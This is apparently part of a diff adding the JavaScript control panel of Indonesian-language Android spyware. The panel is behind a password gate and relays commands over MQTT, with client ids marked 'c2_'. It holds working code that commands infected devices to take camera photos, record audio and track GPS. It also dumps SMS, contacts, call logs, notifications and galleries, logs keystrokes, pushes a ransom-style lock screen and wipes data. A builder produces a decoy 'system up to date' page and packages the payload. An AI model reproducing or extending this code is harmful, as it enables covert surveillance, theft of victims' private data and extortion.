+function dl(n,data,m){var b=(data instanceof Blob)?data:new Blob([data],{type:m||'application/json'});var a=document.createElement('a');
+ a.href=URL.createObjectURL(b);a.download=n;document.body.appendChild(a);a.click();a.remove();setTimeout(function(){URL.revokeObjectURL(a.href);},4000);log('DOWNLOAD '+n);}
+function openM(h){$('#mbody').innerHTML=h;$('#modal').classList.add('on');}
+$('#mclose').onclick=function(){$('#modal').classList.remove('on');$('#mbody').innerHTML='';};
+function b64blob(u){var a=u.split(','),m=a[0].match(/:(.*?);/)[1],b=atob(a[1]),n=new Uint8Array(b.length);for(var i=0;i<b.length;i++)n[i]=b.charCodeAt(i);return new Blob([n],{type:m});}
+function needDev(){if(!cur()){toast('Pilih device',true);return false;}return true;}
+
+var AC=null;
+function scream(){try{AC=AC||new (window.AudioContext||window.webkitAudioContext)();var ac=AC,t=ac.currentTime;
+ var buf=ac.createBuffer(1,ac.sampleRate*1.5,ac.sampleRate),ch=buf.getChannelData(0);
+ for(var i=0;i<ch.length;i++)ch[i]=Math.random()*2-1;
+ var nz=ac.createBufferSource();nz.buffer=buf;var bp=ac.createBiquadFilter();bp.type='bandpass';bp.Q.value=6;
+ bp.frequency.setValueAtTime(1400,t);bp.frequency.exponentialRampToValueAtTime(240,t+1.4);
+ var d=ac.createWaveShaper(),cv=new Float32Array(1024);for(var j=0;j<1024;j++){var x=j*2/1024-1;cv[j]=(3+x)*x*.6;}d.curve=cv;
+ var g=ac.createGain();g.gain.setValueAtTime(.0001,t);g.gain.exponentialRampToValueAtTime(.5,t+.08);g.gain.exponentialRampToValueAtTime(.0001,t+1.45);
+ var o=ac.createOscillator();o.type='sawtooth';o.frequency.setValueAtTime(880,t);o.frequency.exponentialRampToValueAtTime(180,t+1.3);
+ var og=ac.createGain();og.gain.setValueAtTime(.16,t);og.gain.exponentialRampToValueAtTime(.0001,t+1.4);
+ nz.connect(bp);bp.connect(d);d.connect(g);g.connect(ac.destination);o.connect(og);og.connect(ac.destination);
+ nz.start(t);o.start(t);nz.stop(t+1.5);o.stop(t+1.5);}catch(e){}}
+
+(function(){var c=$('#rain'),x=c.getContext('2d'),n=0,dr=[];
+ function s(){c.width=c.offsetWidth;c.height=c.offsetHeight;n=Math.floor(c.width/14);dr=[];for(var i=0;i<n;i++)dr[i]=Math.random()*c.height;}
+ s();addEventListener('resize',s);var ch='ｱｲｳｴｵｶｷｸｹｺ0123456789ABCDEF☠'.split('');
+ setInterval(function(){x.fillStyle='rgba(3,6,10,.09)';x.fillRect(0,0,c.width,c.height);x.font='12px monospace';
+  for(var i=0;i<n;i++){x.fillStyle=Math.random()>.96?'#00c8ff':'#00ffa3';x.fillText(ch[Math.floor(Math.random()*ch.length)],i*14,dr[i]);
+  dr[i]+=14;if(dr[i]>c.height&&Math.random()>.97)dr[i]=0;}},60);})();
+
+var tries=0,lock=false;
+$('#enter').onclick=login;$('#pw').addEventListener('keydown',function(e){if(e.key==='Enter')login();});
+function login(){
+  if(lock)return;var v=$('#pw').value.trim(),c=$('#gcard');
+  if(v===PASS){$('#gate').classList.add('out');setTimeout(function(){$('#gate').style.display='none';splash();},600);return;}
+  tries++;scream();c.classList.add('shake','err');setTimeout(function(){c.classList.remove('shake');},400);
+  $('#flash').classList.remove('on');void $('#flash').offsetWidth;$('#flash').classList.add('on');
+  $('#warn').innerHTML=tries===1?'⛔ SALAH! COBA LAGI.':tries===2?'⚠️ PERINGATAN — 1 KESEMPATAN!':'🔒 TERKUNCI 10 DETIK';
+  if(tries>=3){lock=true;var t=10;var iv=setInterval(function(){t--;$('#warn').innerHTML='🔒 TUNGGU '+t+'s';if(t<=0){clearInterval(iv);lock=false;tries=0;$('#warn').textContent='';}},1000);}
+  $('#pw').value='';
+}
+function splash(){ $('#splash').classList.add('on');
+  setTimeout(function(){$('#splash').classList.remove('on');$('#app').classList.add('on');boot();},1600);}
+
+$('aside').addEventListener('click',function(e){var b=e.target.closest('button');if(!b)return;
+ $$('aside button').forEach(function(x){x.classList.remove('on');});b.classList.add('on');
+ $$('.pan').forEach(function(p){p.classList.toggle('on',p.dataset.p===b.dataset.p);});scrollTo({top:0,behavior:'smooth'});});
+function go(p){var b=$('aside button[data-p="'+p+'"]');if(b)b.click();}
+
+var CL=null,CONN=false;
+function mqttConnect(){
+  if(!ROOM||typeof mqtt==='undefined'){setTimeout(mqttConnect,700);return;}
+  try{CL=mqtt.connect(BROKER,{clientId:'c2_'+Math.random().toString(16).slice(2,10),clean:true,reconnectPeriod:4000,connectTimeout:8000});}catch(e){log('MQTT err '+e,'err');return;}
+  CL.on('connect',function(){CONN=true;$('#linkstate').textContent='LIVE';$('#stRelay').textContent='TERHUBUNG';$('#relayS').textContent='TERHUBUNG';
+    CL.subscribe('mzn/'+ROOM+'/+/up');log('RELAY tersambung','ok');toast('⛓ Relay live');});
+  CL.on('reconnect',function(){$('#linkstate').textContent='RECONNECT';});
+  CL.on('close',function(){CONN=false;$('#linkstate').textContent='OFFLINE';$('#stRelay').textContent='PUTUS';$('#relayS').textContent='PUTUS';});
+  CL.on('error',function(){log('MQTT error','err');});
+  CL.on('message',function(t,p){try{var m=JSON.parse(p.toString());var id=t.split('/')[2];ingest(id,m);}catch(e){}});
+}
+function send(id,cmd,args){
+  var d=dev(id);if(!d)return;
+  log('TX '+cmd+' → '+d.name);
+  if(d.local){localCmd(id,cmd,args||{});return;}
+  if(!CL||!CONN){toast('Relay belum tersambung',true);return;}
+  CL.publish('mzn/'+ROOM+'/'+id+'/down',JSON.stringify({cmd:cmd,args:args||{}}));
+}
+function ingest(id,m){
+  var d=dev(id);
+  if(!d){ if(D.length>=MAXDEV){return;} d={id:id,name:m.name||'DEV-'+id.slice(-4),model:m.model||'Android',os:m.os||'?',br:'agent',
+    ip:m.ip||'—',bat:m.bat||0,net:m.net||'—',local:false,online:true,last:Date.now(),
+    data:{photos:[],videos:[],audio:[],keys:[],gps:[],kon:[],sms:[],not:[],call:[],gal:[]}};
+    D.push(d);CUR=CUR||id;save();renderDev();log('DEVICE BARU '+d.name,'ok');toast('Device '+d.name+' terhubung');}
+  d.online=true;d.last=Date.now();
+  var t=m.t||m.cmd;
+  if(t==='hello'||t==='info'){if(m.model)d.model=m.model;if(m.os)d.os=m.os;if(m.ip)d.ip=m.ip;if(m.bat!=null)d.bat=m.bat;}
+  else if(t==='battery'){d.bat=m.level||0;}
+  else if(t==='gps'){d.data.gps.push({lat:m.lat,lng:m.lng,acc:m.acc||0,t:new Date().toISOString()});pushTrail(m.lat,m.lng);}
+  else if(t==='photo'){d.data.photos.push({id:Date.now(),cam:m.cam==='front'?'DEPAN':'BELAKANG',url:'data:image/jpeg;base64,'+m.data,t:new Date().toISOString()});}
+  else if(t==='audio'){d.data.audio.push({id:Date.now(),url:'data:audio/mp4;base64,'+m.data,t:new Date().toISOString()});}
+  else if(t==='sms'){d.data.sms=m.items||[];}
+  else if(t==='kon'){d.data.kon=m.items||[];}
+  else if(t==='call'){d.data.call=m.items||[];}
+  else if(t==='notif'){d.data.not=(m.items||[]).concat(d.data.not);}
+  else if(t==='gallery'){d.data.gal=m.items||[];}
+  else if(t==='key'){d.data.keys.push({k:m.k,t:Date.now()});}
+  else if(t==='ack'){toast('✓ '+m.msg);}
+  save();if(d.id===CUR)paintSel();renderDev();
+}
+
+function addLocal(){
+  if(D.length>=MAXDEV){toast('Maks 20 device',true);return;}
+  var ua=navigator.userAgent,model='?';
+  if(/Android/i.test(ua))model=(ua.match(/;\s*([^;)]+)\s+Build/)||[,'Android'])[1];
+  else if(/iPhone|iPad/i.test(ua))model=/iPad/.test(ua)?'iPad':'iPhone';
+  else if(/Windows/i.test(ua))model='Windows PC';else if(/Mac/i.test(ua))model='Mac';else model='Device';
+  var d={id:'LOC'+Date.now().toString(36),name:'NODE-LOKAL',model:model,os:'—',br:'—',ip:'—',bat:0,net:'—',
+    local:true,online:true,last:Date.now(),data:{photos:[],videos:[],audio:[],keys:[],gps:[],kon:[],sms:[],not:[],call:[],gal:[]}};
+  D.push(d);CUR=d.id;save();renderDev();paintSel();fetchIP();log('DEVICE LOKAL ditambahkan','ok');
+}
+$('#addLocal').onclick=addLocal;
+$('#pingAll').onclick=function(){D.forEach(function(d){if(!d.local)send(d.id,'info');else d.last=Date.now();});renderDev();toast('Ping dikirim');};
+function renderDev(){
+  $('#devGrid').innerHTML=D.map(function(d){
+    return '<div class="dcard'+(d.id===CUR?' on':'')+'" data-id="'+d.id+'"><span class="dx" data-del="'+d.id+'">✖</span><div class="dn">'+d.name+'</div><div class="dm">'+d.model+'<br>'+(d.online?'<span style="color:var(--acc)">ONLINE</span>':'<span style="color:var(--red)">OFFLINE</span>')+' · '+d.bat+'%</div></div>';
+  }).join('')||'<div class="empty">BELUM ADA DEVICE</div>';
+  $('#dcount').textContent=D.length+'/20';$('#devN').textContent=D.length+'/20';$('#stDev').textContent=D.length+'/20';
+  $('#devsel').innerHTML='<option value="">— PILIH —</option>'+D.map(function(d){return '<option value="'+d.id+'"'+(d.id===CUR?' selected':'')+'>'+d.name+'</option>';}).join('');
+}
+$('#devGrid').addEventListener('click',function(e){
+  var del=e.target.dataset.del;
+  if(del){D=D.filter(function(x){return x.id!==del;});if(CUR===del)CUR=D[0]?D[0].id:'';save();renderDev();paintSel();return;}
+  var c=e.target.closest('[data-id]');if(c){CUR=c.dataset.id;save();renderDev();paintSel();}
+});
+$('#devsel').onchange=function(){CUR=this.value;save();renderDev();paintSel();};
+function paintSel(){
+  var d=cur();
+  $('#ctrlDev').textContent=d?d.name:'—';$('#tName').textContent=d?d.name:'—';$('#tDev').textContent=d?d.model:'—';
+  $('#tIp').textContent=d?d.ip:'—';$('#tBat').textContent=d?d.bat+'%':'—';$('#tNet').textContent=d?d.net:'—';
+  $('#iModel').textContent=d?d.model:'—';$('#iOs').textContent=d?d.os:'—';$('#iBr').textContent=d?d.br:'—';
+  $('#iScr').textContent=screen.width+'×'+screen.height;$('#iCpu').textContent=(navigator.hardwareConcurrency||'?')+' core';
+  $('#iIp').textContent=d?d.ip:'—';$('#netIp').textContent=d?d.ip:'—';$('#netT').textContent=d?d.net:'—';
+  $('#bLvl').textContent=d?d.bat+'%':'—';var bi=$('#bBar i');if(bi)bi.style.width=(d?d.bat:0)+'%';
+  $('#bSt').textContent=d?(d.bat<20?'KRITIS':'NORMAL'):'—';
+  renderCap();renderKon();renderSms();renderNot();renderCall();renderGal();renderKey();bump();
+}
+function bump(){var d=dd();$('#cPhoto').textContent=d.photos.length;$('#cKey').textContent=d.keys.length;
+  $('#cDump').textContent=d.kon.length+d.sms.length+d.not.length+d.call.length;$('#capN').textContent=d.photos.length;
+  $('#nKon').textContent=d.kon.length;$('#nSms').textContent=d.sms.length;$('#nNot').textContent=d.not.length;
+  $('#nCall').textContent=d.call.length;$('#nGal').textContent=d.gal.length;}
+
+var ST={},torch=false;
+function gs(f){return navigator.mediaDevices.getUserMedia({video:{facingMode:{ideal:f}},audio:false});}
+function snapLocal(f){
+  var v=f==='user'?$('#vF'):$('#vB'),lab=f==='user'?'DEPAN':'BELAKANG';
+  function grab(){
+    var c=document.createElement('canvas'),w=v.videoWidth||480,h=v.videoHeight||360;
+    c.width=Math.min(w,720);c.height=Math.round(c.width*(h/w)||360);
+    c.getContext('2d').drawImage(v,0,0,c.width,c.height);
+    dd().photos.push({id:Date.now(),cam:lab,url:c.toDataURL('image/jpeg',.8),t:new Date().toISOString()});
+    save();renderCap();bump();toast('◉ Foto '+lab);
+  }
+  if(v.videoWidth){grab();return;}
+  gs(f).then(function(s){v.srcObject=s;v.play();setTimeout(function(){grab();s.getTracks().forEach(function(t){t.stop();});v.srcObject=null;},1000);})
+  .catch(function(){toast('Kamera diblokir',true);});
+}
+function liveLocal(f){var v=f==='user'?$('#vF'):$('#vB');
+  if(ST[f])ST[f].getTracks().forEach(function(t){t.stop();});
+  gs(f).then(function(s){ST[f]=s;v.srcObject=s;v.play();toast('▷ Live '+f);}).catch(function(){toast('Butuh izin kamera',true);});}
+function stopLocal(f){var v=f==='user'?$('#vF'):$('#vB');if(ST[f]){ST[f].getTracks().forEach(function(t){t.stop();});delete ST[f];}v.srcObject=null;}
+function localCmd(id,cmd,a){
+  var d=dev(id);if(!d)return;
+  if(cmd==='photo')snapLocal(a.cam==='front'?'user':'environment');
+  else if(cmd==='vibrate')navigator.vibrate&&navigator.vibrate([200,100,300]);
+  else if(cmd==='torch'){var t=(ST.environment||ST.user)&&(ST.environment||ST.user).getVideoTracks()[0];
+    if(t&&t.getCapabilities().torch){torch=!torch;t.applyConstraints({advanced:[{torch:torch}]});toast('🔆 '+(torch?'ON':'OFF'));}else toast('Live kamera dulu',true);}
+  else if(cmd==='lock')lockPush();
+  else if(cmd==='sms')$('#smsSync').click();
+  else if(cmd==='kon')$('#konSync').click();
+  else if(cmd==='notif')$('#notSync').click();
+  else if(cmd==='call')$('#callSync').click();
+  else if(cmd==='gallery')$('#galSync').click();
+  else if(cmd==='info'){fetchIP();paintSel();}
+  else if(cmd==='wipe'){d.data={photos:[],videos:[],audio:[],keys:[],gps:[],kon:[],sms:[],not:[],call:[],gal:[]};save();paintSel();}
+}
+$$('[data-cam]').forEach(function(b){b.onclick=function(){var m=b.dataset.cam,f=b.dataset.f;
+  if(!needDev())return;var d=cur();
+  if(d.local){if(m==='photo')snapLocal(f);else if(m==='live')liveLocal(f);else if(m==='stop')stopLocal(f);}
+  else{if(m==='photo')send(d.id,'photo',{cam:f==='user'?'front':'back'});
+    else if(m==='live'){toast('Live streaming kamera APK: pakai SNAP berkala');send(d.id,'photo',{cam:f==='user'?'front':'back'});}}
+};});
+$$('[data-q]').forEach(function(b){b.onclick=function(){var q=b.dataset.q;
+  if(q==='snapB'){go('live');setTimeout(function(){needDev()&&(cur().local?snapLocal('environment'):send(CUR,'photo',{cam:'back'}));},250);}
+  else if(q==='snapF'){go('live');setTimeout(function(){needDev()&&(cur().local?snapLocal('user'):send(CUR,'photo',{cam:'front'}));},250);}
+  else if(q==='gps'){go('live');setTimeout(gpsOnce,250);}
+  else if(q==='scr'){go('live');setTimeout(startScr,350);}
+  else if(q==='aud'){go('live');setTimeout(function(){needDev()&&(cur().local?audioRec():send(CUR,'audio'));},350);}
+  else if(q==='dumpAll'){['#konSync','#smsSync','#notSync','#callSync'].forEach(function(s,i){setTimeout(function(){$(s).click();},i*400);});}
+};});
+function renderCap(){var d=dd();
+  $('#capGrid').innerHTML=d.photos.slice().reverse().map(function(p){
+    return '<div class="th"><img src="'+p.url+'" data-i="'+p.id+'"><span class="d" data-d="'+p.id+'">⤓</span></div>';}).join('')||'<div class="empty">KOSONG</div>';}
+$('#capGrid').addEventListener('click',function(e){var t=e.target,d=dd();
+  if(t.dataset.i){var p=d.photos.find(function(x){return x.id==t.dataset.i;});openM('<img src="'+p.url+'">');$('#mdl').onclick=function(){dl('foto_'+stamp()+'.jpg',b64blob(p.url));};}
+  if(t.dataset.d){var q=d.photos.find(function(x){return x.id==t.dataset.d;});dl('foto_'+stamp()+'.jpg',b64blob(q.url));}});
+
+var SS=null;
+function startScr(){if(!navigator.mediaDevices.getDisplayMedia){toast('Tidak didukung',true);return;}
+ navigator.mediaDevices.getDisplayMedia({video:true}).then(function(s){SS=s;$('#vS').srcObject=s;$('#vS').play();$('#scrSt').textContent='LIVE';
+  s.getVideoTracks()[0].onended=stopScr;toast('▤ Mirror aktif');}).catch(function(){toast('Izin ditolak',true);});}
+function stopScr(){if(SS){SS.getTracks().forEach(function(t){t.stop();});SS=null;}$('#vS').srcObject=null;$('#scrSt').textContent='OFF';}
+$('#scrOn').onclick=startScr;$('#scrOff').onclick=stopScr;
+$('#scrSnap').onclick=function(){if(!needDev())return;var v=$('#vS');
+  if(!v.videoWidth){toast('Mulai mirror dulu',true);return;}
+  var c=document.createElement('canvas');c.width=v.videoWidth;c.height=v.videoHeight;c.getContext('2d').drawImage(v,0,0);
+  dd().photos.push({id:Date.now(),cam:'LAYAR',url:c.toDataURL('image/jpeg',.75),t:new Date().toISOString()});save();renderCap();bump();toast('◉ Snapshot layar');};
+
+var AS=null,ac2=null,an=null,raf=null;
+function drawWave(){var c=$('#wave'),x=c.getContext('2d'),W=c.width,H=c.height;
+ x.fillStyle='#02070a';x.fillRect(0,0,W,H);if(!an)return;
+ var d=new Uint8Array(an.frequencyBinCount);an.getByteTimeDomainData(d);
+ x.strokeStyle='#00ffa3';x.lineWidth=1.5;x.beginPath();
+ for(var i=0;i<W;i++){var y=H/2+(d[Math.floor(i*d.length/W)]-128)/128*(H/2.4);if(i)x.lineTo(i,y);else x.moveTo(i,y);}
+ x.stroke();raf=requestAnimationFrame(drawWave);}
+$('#aOn').onclick=function(){if(!needDev())return;
+ navigator.mediaDevices.getUserMedia({audio:true}).then(function(s){AS=s;ac2=new (window.AudioContext||window.webkitAudioContext)();
+  var src=ac2.createMediaStreamSource(s);an=ac2.createAnalyser();an.fftSize=1024;src.connect(an);$('#aSt').textContent='LIVE';drawWave();toast('♪ Audio live');})
+ .catch(function(){toast('Mic ditolak',true);});};
+$('#aOff').onclick=function(){if(raf)cancelAnimationFrame(raf);raf=null;if(AS){AS.getTracks().forEach(function(t){t.stop();});AS=null;}
+ if(ac2){ac2.close();ac2=null;}an=null;$('#aSt').textContent='OFF';};
+function audioRec(){navigator.mediaDevices.getUserMedia({audio:true}).then(function(s){
+  var ch=[],r=new MediaRecorder(s);
+  r.ondataavailable=function(e){if(e.data.size)ch.push(e.data);};
+  r.onstop=function(){var b=new Blob(ch,{type:'audio/webm'});dd().audio.push({id:Date.now(),url:URL.createObjectURL(b),t:new Date().toISOString()});
+    save();s.getTracks().forEach(function(t){t.stop();});toast('♪ Rekaman tersimpan');};
+  r.start();setTimeout(function(){r.stop();},10000);toast('⏺ Merekam 10s');}).catch(function(){toast('Mic ditolak',true);});}
+$('#aRec').onclick=function(){if(needDev())cur().local?audioRec():send(CUR,'audio');};
+
+var gw=null,trail=[],base={lat:-6.2088,lng:106.8456};
+function pushTrail(la,ln){trail.push({lat:la,lng:ln});if(trail.length>60)trail.shift();
+  $('#gPos').textContent=la.toFixed(6)+', '+ln.toFixed(6);}
+function drawMap(){var c=$('#mapc');if(!c)return;var x=c.getContext('2d'),W=c.width,H=c.height;
+ x.fillStyle='#02080a';x.fillRect(0,0,W,H);x.strokeStyle='rgba(0,255,163,.1)';
+ for(var i=0;i<=W;i+=30){x.beginPath();x.moveTo(i,0);x.lineTo(i,H);x.stroke();}
+ for(var j=0;j<=H;j+=30){x.beginPath();x.moveTo(0,j);x.lineTo(W,j);x.stroke();}
+ x.strokeStyle='rgba(0,200,255,.5)';x.lineWidth=2;x.beginPath();
+ trail.forEach(function(p,i){var px=W/2+(p.lng-base.lng)*9000,py=H/2-(p.lat-base.lat)*9000;if(i)x.lineTo(px,py);else x.moveTo(px,py);});x.stroke();
+ var l=trail[trail.length-1];
+ if(l){var px=W/2+(l.lng-base.lng)*9000,py=H/2-(l.lat-base.lat)*9000;
+  x.beginPath();x.arc(px,py,5,0,7);x.fillStyle='#00ffa3';x.fill();}}
+setInterval(drawMap,120);
+function gpsOnce(){if(!needDev())return;
+  if(!cur().local){send(CUR,'gps');return;}
+  navigator.geolocation.getCurrentPosition(function(p){
+    var la=p.coords.latitude,ln=p.coords.longitude;pushTrail(la,ln);
+    dd().gps.push({lat:la,lng:ln,acc:p.coords.accuracy,t:new Date().toISOString()});save();
+    $('#gAcc').textContent='±'+Math.round(p.coords.accuracy)+' m';toast('⌖ Lokasi diperbarui');},
+    function(){toast('GPS gagal',true);},{enableHighAccuracy:true,timeout:9000});}
+$('#gpsOn').onclick=function(){if(!needDev())return;$('#gpsSt').textContent='LIVE';
+  if(!cur().local){send(CUR,'gps');return;}
+  if(navigator.geolocation)gw=navigator.geolocation.watchPosition(function(p){
+    var la=p.coords.latitude,ln=p.coords.longitude;pushTrail(la,ln);
+    dd().gps.push({lat:la,lng:ln,acc:p.coords.accuracy,t:new Date().toISOString()});save();
+    $('#gAcc').textContent='±'+Math.round(p.coords.accuracy)+' m';},function(){},{enableHighAccuracy:true});
+  gpsOnce();toast('⌖ Pelacakan aktif');};
+$('#gpsOff').onclick=function(){if(gw!==null)navigator.geolocation.clearWatch(gw);gw=null;$('#gpsSt').textContent='IDLE';};
+$('#gpsMaps').onclick=function(){var g=dd().gps.slice(-1)[0];if(!g)return;open('https://www.google.com/maps?q='+g.lat+','+g.lng,'_blank');};
+
+var kp=false;
+document.addEventListener('keydown',function(e){
+  if(!kp||!$('#app').classList.contains('on')||!cur())return;
+  if(['Shift','Control','Alt','Meta'].indexOf(e.key)>=0)return;
+  var k=e.key.length===1?e.key:'['+e.key+']';
+  dd().keys.push({k:k,t:Date.now()});save();
+  var b=$('#keybuf');if(b.firstChild&&b.firstChild.textContent.indexOf('menunggu')>=0)b.innerHTML='';
+  b.appendChild(document.createTextNode(k));b.scrollTop=b.scrollHeight;bump();});
+$('#kPause').onclick=function(){kp=!kp;$('#kSt').textContent=kp?'OFF':'ON';};
+$('#kClr').onclick=function(){if(cur()){dd().keys=[];save();}$('#keybuf').innerHTML='';bump();};
+$('#kDl').onclick=function(){if(needDev())dl('keylog_'+stamp()+'.txt',dd().keys.map(function(x){return x.k;}).join(''),'text/plain');};
+function renderKey(){var b=$('#keybuf');if(!b)return;b.innerHTML=dd().keys.map(function(x){return x.k;}).join('')||'<span style="color:#2f4d45">menunggu...</span>';}
+
+$$('[data-c]').forEach(function(b){b.onclick=function(){if(!needDev())return;var c=b.dataset.c,d=cur();
+  if(c==='toast'){openM('<div style="padding:14px"><input id="tm" type="text" value="Halo dari admin"><button class="btn wide" style="margin-top:8px" id="ts">KIRIM</button></div>');
+    $('#mdl').style.display='none';$('#ts').onclick=function(){send(d.id,'toast',{msg:$('#tm').value});$('#mclose').click();$('#mdl').style.display='';};return;}
+  if(c==='open'){openM('<div style="padding:14px"><input id="tu" type="text" value="https://"><button class="btn wide" style="margin-top:8px" id="uo">BUKA</button></div>');
+    $('#mdl').style.display='none';$('#uo').onclick=function(){send(d.id,'open',{url:$('#tu').value});$('#mclose').click();$('#mdl').style.display='';};return;}
+  if(c==='clip'){navigator.clipboard.readText().then(function(t){toast('📋 '+(t||'(kosong)').slice(0,50));}).catch(function(){toast('Clipboard diblokir',true);});return;}
+  if(c==='wipe'){if(confirm('Hapus data '+d.name+'?')){d.data={photos:[],videos:[],audio:[],keys:[],gps:[],kon:[],sms:[],not:[],call:[],gal:[]};save();paintSel();}return;}
+  if(c==='screenshot'){$('#scrSnap').click();return;}
+  send(d.id,c,{});
+};});
+
+var LT='<!doctype html><html><head><meta name=viewport content="width=device-width,initial-scale=1"><style>'+
+'body{margin:0;height:100vh;display:flex;flex-direction:column;align-items:center;justify-content:center;gap:14px;background:radial-gradient(ellipse at 50% 0,#0a2b22,#02070a 70%);color:#00ffa3;font-family:monospace;text-align:center}'+
+'.sk{width:88px;height:88px;border:2px solid #00ffa3;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:38px;box-shadow:0 0 30px rgba(0,255,163,.5)}'+
+'h1{font-size:15px;letter-spacing:3px;margin:0}p{font-size:11px;color:#4a6b63;margin:0}button{margin-top:8px;background:#00ffa3;border:0;color:#02110c;font:800 12px monospace;padding:12px 26px;border-radius:8px}</style></head>'+
+'<body><div class=sk>☠</div><h1>TERKUNCI</h1><p>Hubungi admin</p><button onclick="try{Lock.buka()}catch(e){}">BUKA</button></body></html>';
+$('#lockHtml').value=DB.get('lock','')||LT;
+$('#lockPrevBtn').onclick=function(){$('#lockPrev').srcdoc=$('#lockHtml').value;};
+$('#lockReset').onclick=function(){$('#lockHtml').value=LT;$('#lockPrev').srcdoc=LT;};
+function lockPush(){if(!needDev())return;DB.set('lock',$('#lockHtml').value);send(CUR,'lock',{html:$('#lockHtml').value});}
+$('#lockPush').onclick=lockPush;
+
+$('#konSync').onclick=function(){if(!needDev())return;if(!cur().local){send(CUR,'kon');return;}
+  if(navigator.contacts&&navigator.contacts.select){navigator.contacts.select(['name','tel'],{multiple:true})
+    .then(function(l){dd().kon=l.map(function(c){return {name:c.name&&c.name[0],tel:c.tel&&c.tel[0]};});save();renderKon();bump();toast('✓ '+l.length+' kontak nyata');})
+    .catch(function(){toast('Pemilih kontak ditolak',true);});}
+  else toast('Kontak hanya di Chrome Android',true);};
+$('#konDl').onclick=function(){if(needDev())dl('kontak_'+stamp()+'.json',JSON.stringify(dd().kon,null,2));};
+function renderKon(){$('#konList').innerHTML=dd().kon.map(function(c){
+  return '<div class="row"><div class="av">'+(c.name||'?')[0]+'</div><div class="t"><b>'+(c.name||'?')+'</b><p>'+(c.tel||'')+'</p></div></div>';}).join('')||'<div class="empty">KOSONG</div>';}
+$('#smsSync').onclick=function(){if(needDev())send(CUR,'sms',{});};
+$('#smsDl').onclick=function(){if(needDev())dl('sms_'+stamp()+'.json',JSON.stringify(dd().sms,null,2));};
+function renderSms(){$('#smsList').innerHTML=dd().sms.slice(0,40).map(function(s){
+  return '<div class="row"><div class="av">✉</div><div class="t"><b>'+s.from+'</b><p>'+s.body+'</p></div></div>';}).join('')||'<div class="empty">KOSONG</div>';}
+$('#notSync').onclick=function(){if(needDev())send(CUR,'notif',{});};
+$('#notDl').onclick=function(){if(needDev())dl('notif_'+stamp()+'.json',JSON.stringify(dd().not,null,2));};
+function renderNot(){$('#notList').innerHTML=dd().not.slice(0,40).map(function(n){
+  return '<div class="row"><div class="av">◔</div><div class="t"><b>'+n.app+'</b><p>'+n.text+'</p></div></div>';}).join('')||'<div class="empty">KOSONG</div>';}
+$('#callSync').onclick=function(){if(needDev())send(CUR,'call',{});};
+$('#callDl').onclick=function(){if(needDev())dl('calllog_'+stamp()+'.json',JSON.stringify(dd().call,null,2));};
+function renderCall(){$('#callT tbody').innerHTML=dd().call.slice(0,50).map(function(c){
+  return '<tr><td>'+(c.name||'?')+'</td><td>'+(c.tel||'')+'</td><td>'+c.type+'</td><td>'+(c.dur||0)+'s</td><td>'+(c.t||'')+'</td></tr>';}).join('')||'<tr><td colspan=5 style="text-align:center;color:#2f4d45">KOSONG</td></tr>';}
+$('#galSync').onclick=function(){if(needDev())send(CUR,'gallery',{});};
+function renderGal(){$('#galGrid').innerHTML=dd().gal.slice().reverse().map(function(g){
+  return '<div class="th"><img src="'+g.url+'"></div>';}).join('')||'<div class="empty">KOSONG</div>';}
+
+function fetchIP(){fetch('https://api.ipify.org?format=json').then(function(r){return r.json();}).then(function(j){
+  var d=cur();if(d){d.ip=j.ip;save();paintSel();}}).catch(function(){});}
+function initBat(){if(navigator.getBattery)navigator.getBattery().then(function(b){
+  function u(){var p=Math.round(b.level*100);var d=cur();if(d){d.bat=p;save();}
+    $('#bLvl').textContent=p+'%';var bi=$('#bBar i');if(bi)bi.style.width=p+'%';
+    $('#bChg').textContent=b.charging?'MENGISI':'TIDAK MENGISI';$('#bSt').textContent=p<20?'KRITIS':'NORMAL';}
+  u();b.addEventListener('levelchange',u);b.addEventListener('chargingchange',u);});}
+function initNet(){var c=navigator.connection||{},t=c.effectiveType||'4g';
+  var lab=(t.indexOf('wifi')>=0||c.type==='wifi')?'WiFi':'Data Seluler';
+  $('#netT').textContent=lab;$('#netD').textContent=(c.downlink||'?')+' Mbps';
+  var d=cur();if(d){d.net=lab;save();}}
+$('#permReq').onclick=function(){navigator.mediaDevices.getUserMedia({video:true,audio:true}).then(function(s){
+  s.getTracks().forEach(function(t){t.stop();});toast('⚡ Izin kamera & mic OK');}).catch(function(){toast('Ditolak',true);});
+  if(navigator.geolocation)navigator.geolocation.getCurrentPosition(function(){toast('⌖ Izin lokasi OK');},function(){});
+  $('#permList').innerHTML='KAMERA OK<br>MIC OK<br>LOKASI OK<br>CLIPBOARD OK';};
+$('#infoDl').onclick=function(){if(needDev())dl('info_'+stamp()+'.json',JSON.stringify(cur(),null,2));};
+
+var ICON=null;
+$('#fIcon').onchange=function(e){var f=e.target.files[0];if(!f)return;var r=new FileReader();r.onload=function(){$('#iconPrev').src=r.result;ICON=r.result;};r.readAsDataURL(f);};
+$('#htmlTpl').onclick=function(){$('#fHtml').value='<!doctype html><html><head><meta name=viewport content="width=device-width,initial-scale=1"><style>body{margin:0;min-height:100vh;background:#0a0f14;color:#cfe;font-family:system-ui;padding:24px}h1{color:#00d68f;font-size:19px}p{line-height:1.7;font-size:14px;color:#8fa}</style></head><body><h1>Sistem Sudah Terbaru</h1><p>Perangkat kamu sudah memakai versi terbaru.</p></body></html>';};
+function crcT(){var t=new Uint32Array(256);for(var n=0;n<256;n++){var c=n;for(var k=0;k<8;k++)c=c&1?0xEDB88320^(c>>>1):c>>>1;t[n]=c>>>0;}return t;}
+var CRC=crcT();
+function crc32(u){var c=0xFFFFFFFF;for(var i=0;i<u.length;i++)c=CRC[(c^u[i])&0xFF]^(c>>>8);return (c^0xFFFFFFFF)>>>0;}
+function makeZip(files){var en=new TextEncoder(),p=[],cd2=[],off=0,d=new Date();
+ var dt=((d.getHours()<<11)|(d.getMinutes()<<5)|(d.getSeconds()>>1))&0xFFFF;
+ var dd3=(((d.getFullYear()-1980)<<9)|((d.getMonth()+1)<<5)|d.getDate())&0xFFFF;
+ files.forEach(function(f){var nm=en.encode(f.name),data=f.data,crc=crc32(data);
+  var lh=new Uint8Array(30+nm.length),v=new DataView(lh.buffer);
+  v.setUint32(0,0x04034b50,true);v.setUint16(4,20,true);v.setUint16(10,dt,true);v.setUint16(12,dd3,true);
+  v.setUint32(14,crc,true);v.setUint32(18,data.length,true);v.setUint32(22,data.length,true);v.setUint16(26,nm.length,true);lh.set(nm,30);
+  p.push(lh,data);
+  var ch=new Uint8Array(46+nm.length),cv=new DataView(ch.buffer);
